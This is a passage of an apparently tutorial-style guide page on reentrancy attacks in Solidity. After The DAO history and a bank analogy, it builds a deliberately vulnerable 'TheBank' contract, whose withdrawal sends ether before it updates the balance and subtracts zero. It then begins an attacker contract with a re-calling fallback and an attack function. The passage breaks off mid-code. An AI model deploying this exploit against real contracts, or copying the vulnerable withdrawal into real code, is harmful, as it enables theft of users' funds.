menu__link--sublist-caret" aria-expanded="false" tabindex="0">Ethereum Upgrades</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Other Chains</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Custom Chains, AppChains, &amp; RaaS</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Cross-Chain</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">QuickNode Products</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">DeFi</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Infrastructure</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Web3 Fundamentals &amp; Security</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Podcasts &amp; Other Media</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a href="#" class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false">Social</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_RiV8"><div class="container padding-top--md px-0 !max-w-none"><div class="py-8 px-4 lg:px-20 border-b border-gray-200"><div><h1 data-search="title" class="mb-4 Text-module_text__MaWZT text-3xl font-bold">A Broad Overview of Reentrancy Attacks in Solidity Contracts</h1><div class="flex flex-wrap"><div class="flex first:pl-0 pl-2"><div class="mr-1 Text-module_text__MaWZT Text-module_text--faint__hlitO text-md">Updated on</div><div class="Text-module_text__MaWZT text-md">Jul 3, 2023</div></div></div><div class="mt-4"><section><div class="flex gap-2 flex-wrap"><a href="/guides/tags/ethereum/" class="hover:no-underline"><div class="px-2 py-1 text-sm inline-flex rounded whitespace-nowrap Badge-module_badge__QwW4l Badge-module_badge--neutral__nM6EW Badge-module_badge--outline__SXfbr">Ethereum</div></a><a href="/guides/tags/remix-ide/" class="hover:no-underline"><div class="px-2 py-1 text-sm inline-flex rounded whitespace-nowrap Badge-module_badge__QwW4l Badge-module_badge--neutral__nM6EW Badge-module_badge--outline__SXfbr">Remix.IDE</div></a><a href="/guides/tags/smart-contracts/" class="hover:no-underline"><div class="px-2 py-1 text-sm inline-flex rounded whitespace-nowrap Badge-module_badge__QwW4l Badge-module_badge--neutral__nM6EW Badge-module_badge--outline__SXfbr">Smart Contracts</div></a><a href="/guides/tags/solidity/" class="hover:no-underline"><div class="px-2 py-1 text-sm inline-flex rounded whitespace-nowrap Badge-module_badge__QwW4l Badge-module_badge--neutral__nM6EW Badge-module_badge--outline__SXfbr">Solidity</div></a><a href="/guides/tags/security/" class="hover:no-underline"><div class="px-2 py-1 text-sm inline-flex rounded whitespace-nowrap Badge-module_badge__QwW4l Badge-module_badge--neutral__nM6EW Badge-module_badge--outline__SXfbr">Security</div></a></div></section></div></div></div><div id="doc-item-page"><div class="row mx-0 !px-0"><div class="col px-0 docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/guides/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Ethereum Development</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Smart Contracts</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Overview of Reentrancy Attacks</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><p><em>17 min read</em></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Have you ever heard about reentrancy attacks and wondered what it's all about? This quick guide gives a deep dive into everything you need to know about reentrancy manipulation.  </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-we-will-do">What We Will Do<a href="#what-we-will-do" class="hash-link" aria-label="Direct link to What We Will Do" title="Direct link to What We Will Do">​</a></h4><ul><li>Learn about reentrancy attacks</li><li>Learn how to implement reentrancy in a smart contract</li><li>Learn the different types of reentrancy attacks</li><li>Recap real-world incidents of reentrancy attacks</li><li>Learn how to protect against reentrancy attacks</li></ul><h4></h4><p>What You Will Need</p><ul><li>Basic understanding of smart contracts and the EVM</li><li>Basic knowledge of Solidity</li><li>Access to <a href="https://remix.ethereum.org/#optimize=false&amp;runs=200&amp;evmVersion=null&amp;version=soljson-v0.8.7+commit.e28d00a7.js" target="_blank" rel="noopener noreferrer">Remix IDE</a> or VScode. If you choose to use VScode, ensure you go to the extension marketplace and install the <a href="https://marketplace.visualstudio.com/items?itemName=JuanBlanco.solidity" target="_blank" rel="noopener noreferrer">Solidity extension of Juan Blanco</a>.  </li></ul><h4 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h4><p>Since the Ethereum community kicked off in 2015, they have always tried to foster human interactions with the blockchain. This led to the creation of The DAO, the first-ever decentralized autonomous organization on the blockchain.  </p><p>Unfortunately, the following year, The DAO experienced an unfortunate event when some blackhat hackers <a href="https://www.coindesk.com/markets/2016/06/17/the-dao-attacked-code-issue-leads-to-60-million-ether-theft/" target="_blank" rel="noopener noreferrer">drained around $60 million</a> away through a malicious practice called a <em>reentrancy attack</em>.  </p><p>Does that attack ring a bell? Let us dive deeper into what that is.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-a-reentrancy-attack">What is a Reentrancy Attack?<a href="#what-is-a-reentrancy-attack" class="hash-link" aria-label="Direct link to What is a Reentrancy Attack?" title="Direct link to What is a Reentrancy Attack?">​</a></h2><p>A <em>reentrancy attack</em> is a type of smart contract vulnerability where an exploiter contract leverages the loophole of the victim contract to continuously withdraw from it until the victim contract goes bankrupt. The main reason an attacker contract can reenter is if the victim contract does not ascertain the new balance of the exploiter on time.  </p><p>Foremost, it is essential to underscore that a significant way smart contracts interact is by calling one another. Therefore, smart contract X can call smart contract Y to deposit some tokens. The general procedure is that contract X will try to check if the calling contract has some sufficient tokens, then it will deposit accordingly.  </p><p>In the case of reentrancy, the attacker contract will deposit into a victim contract and then make a call to withdraw. Ironically, the attacker smart contract developer would have intentionally not given the contract the ability to receive tokens. Thus, when the victim contract innocently sends some tokens, the exploiter contract would not be able to receive them, and this mismatch will trigger the fallback function, which receives Ether when there is an anomaly such as this. But the attacker contract will have more than the default fallback function as it will hold additional manipulative code that will call the victim contract to keep sending Ether. While one part of the victim contract still expects the calling contract to have a withdrawal function, the attacker contract will trick another part of the victim contract into continuously sending Ether (or another token).  </p><p>That is how reentrancy works on a smart contract basis. To aid your understanding, let us go a step further to explain reentrancy using real-life scenarios.  </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="explaining-how-reentrancy-attack-works-with-illustrations">Explaining How Reentrancy Attack Works with Illustrations<a href="#explaining-how-reentrancy-attack-works-with-illustrations" class="hash-link" aria-label="Direct link to Explaining How Reentrancy Attack Works with Illustrations" title="Direct link to Explaining How Reentrancy Attack Works with Illustrations">​</a></h2><p>Assume there is a bank in a small city called the Bank of the People. Everyone keeps his or her money there, and the bank has a total amount of $100k liquidity.  </p><p>Now, the bank has an accounting flaw such that when people withdraw money, the staffers of the bank do not update the records immediately but wait until the end of the day when they are doing a general review and updating balances of everyone. Since no customer has ever tried to withdraw more than the amount they had in the account, this flaw went undetected.  </p><p>Let's imagine a scenario where someone, John, who is not yet a customer of the bank, notices that his friends who use this bank only get the alert of their withdrawal and balance around 6 PM any day they withdraw. John decides to also create an account in the Bank of the People and deposits $1k.  </p><p>The following week, John opens the bank’s application on his phone and withdraws the $1k. 5 minutes later, he makes another attempt. Since the bank has not updated John's balance, his records still show that John has a $1k deposit in his account even though he has withdrawn it.  </p><p>This continues until John has withdrawn all the $100k the bank has, and the staffers do not discover it until they are accounting for the day and realize that John had tricked their system. Although reentrancy can be more complex, that is a simple illustration of how attackers can go about it.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="explaining-reentrancy-with-custom-solidity-contracts">Explaining Reentrancy with Custom Solidity Contracts<a href="#explaining-reentrancy-with-custom-solidity-contracts" class="hash-link" aria-label="Direct link to Explaining Reentrancy with Custom Solidity Contracts" title="Direct link to Explaining Reentrancy with Custom Solidity Contracts">​</a></h2><p>With all the explanations we have made above, both from the technical and real-life perspectives, you should have had a better understanding of reentrancy.  </p><p>Next, we will roll up our sleeves to build a contract and create an attacker contract to reenter it. First, let us create our hypothetical bank.</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="creating-the-victim-smart-contract">Creating the Victim Smart Contract<a href="#creating-the-victim-smart-contract" class="hash-link" aria-label="Direct link to Creating the Victim Smart Contract" title="Direct link to Creating the Victim Smart Contract">​</a></h4><p><strong>Step 1: Create a New File<br></strong>Head to your Remix, and create a file named “TheBank.sol.” Declare the compiler version that you want; in this case, we used the latest version - 0.8.17. This will be the <strong>victim contract.</strong>  </p><p><strong>Step 2: Create a Mapping for Balances<br></strong>Several addresses will exist in the bank. To track the number of the addresses, it is witty to map the addresses to uint.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">mapping(address =&gt; uint) theBalances;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 3: Deposit Function</strong></p><p>In an ideal bank, the customers should be able to deposit funds. You'll want to create a function representing this action, make the visibility to be public, and make it <strong>payable</strong> so the function will be able to receive ether.  </p><p>Put a requirement that the bank’s customers could only deposit 1 ether and above, nothing else. Increment the value of funds within the contract if the depositing address passes this check.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function deposit() public payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(msg.value &gt;= 1 ether, "cannot deposit below 1 ether");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] += msg.value;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 4: Withdrawal Function</strong></p><p>Next, create a withdrawal function. Put a check into the withdrawal function that the balances of the sender should be greater than or equal to 1 ether. Or else, there should be an error message that the person trying to withdraw must have the requirement.  </p><p>Since we will use the <strong>theBalances<!-- -->[<!-- -->msg.sender<!-- -->]</strong> in the call, assign it to the <strong>bal</strong> variable for composability and readability. We made a low-level transfer call in line with the current compiler version.  </p><p>Then, decrement the balances of <strong>msg.sender</strong>:&nbsp;  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function withdrawal() public {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(theBalances[msg.sender] &gt;= 1 ether, "must have at least one ether");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    uint bal = theBalances[msg.sender];</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    (bool success, ) = msg.sender.call{value: bal} ("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBalances[msg.sender] -= 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="Toggle word wrap" title="Toggle word wrap"><svg class="wordWrapButtonIcon_Bwma" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 5: Get Total Balance</strong></p><p>You'll also need a function, <strong>totalBalance</strong>, that returns the total balance of the funds in the bank. Write this getter function and make its returning parameter <strong>uint</strong> since we are expecting numbers.  </p><p>Then, <strong>return address(this).balance</strong> which is a global variable for the ether balance in a contract.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function totalBalance() public view returns(uint) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    return address(this).balance;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>When you are done, your code should look like this:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">pragma solidity ^0.8.17;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">contract TheBank {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    mapping(address =&gt; uint) theBalances;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    function deposit() public payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        require(msg.value &gt;= 1 ether, "cannot deposit below 1 ether");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBalances[msg.sender] += msg.value;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    function withdrawal() public {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        require(</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            theBalances[msg.sender] &gt;= 1 ether,</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            "must have at least one ether"</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        );</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        uint bal = theBalances[msg.sender];</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        (bool success, ) = msg.sender.call{value: bal}("");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        require(success, "transaction failed");</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBalances[msg.sender] -= 0;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    function totalBalance() public view returns (uint) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        return address(this).balance;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Having successfully created our victim contract, shall we code the attacker contract?  </p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="creating-the-attacker-smart-contract">Creating the Attacker Smart Contract<a href="#creating-the-attacker-smart-contract" class="hash-link" aria-label="Direct link to Creating the Attacker Smart Contract" title="Direct link to Creating the Attacker Smart Contract">​</a></h4><p><strong>Step 1: Create a New File</strong></p><p>Create a new file on Remix and name it “TheAttacker.sol.” This will be the attacker contract.  </p><p><strong>Step 2: Import TheBank Contract</strong></p><p>The attacker contract will need to interact with TheBank contrant. Therefore, you will have to import it right after you declare your compiler version.  </p><p>But you must note something important here:  </p><p>If it were to be the case that you are creating the two contracts under the same pragma declaration, there is no need to import at all.  </p><p><strong>Step 3: Create your State</strong></p><p>You cannot make a direct interaction with the name TheBank. Therefore, you have to store it in a variable, which is TheBank in this case.  </p><p>Like we did earlier for the balances, create a map addresses to numbers and name it balances.  </p><p>Initialize the state variables in the constructor. First,pass the address of theBank into the parameter. Then set 'TheBank' to the contract address of 'TheBank' - the victim contract.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">TheBank public theBank;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">mapping(address =&gt; uint) public balances;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">constructor(address _thebankAddress) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBank = TheBank(_thebankAddress);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 4: Fallback Function</strong></p><p>Recall that the fallback function is the core ingredient of reentrancy, so declare your fallback function. Then create an if statement that so far the address of the victim is equal to or greater than 1 ether, it should keep calling the withdrawal function in theBank.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">receive() external payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    if(address(theBank).balance &gt;= 1 ether) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        theBank.withdrawal();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    }</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 5: Attack Function</strong></p><p>It is time to carry out the money heist in the attack function. Require that the value must be up to 1 ether and above. Call the deposit function of <strong>theBank</strong> with 1 ether. Then, call the withdrawal function in theBank as well.  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function attack() external payable {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    require(msg.value &gt;= 1 ether);</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBank.deposit{value: 1 ether} ();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    theBank.withdrawal();</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong>Step 6: Get Balances</strong></p><p>This works the same way with how we created the <strong>totalBalance</strong> function earlier:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">function getBalances() public view returns(uint) {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    return address(this).balance;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>At the end of the day, your code should look like this:  </p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">pragma solidity ^0.8.17;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">import "TheBank.sol";</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">contract TheAttacker {</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    TheBank public theBank;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    mapping(address =&gt; uint) public balances;</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span 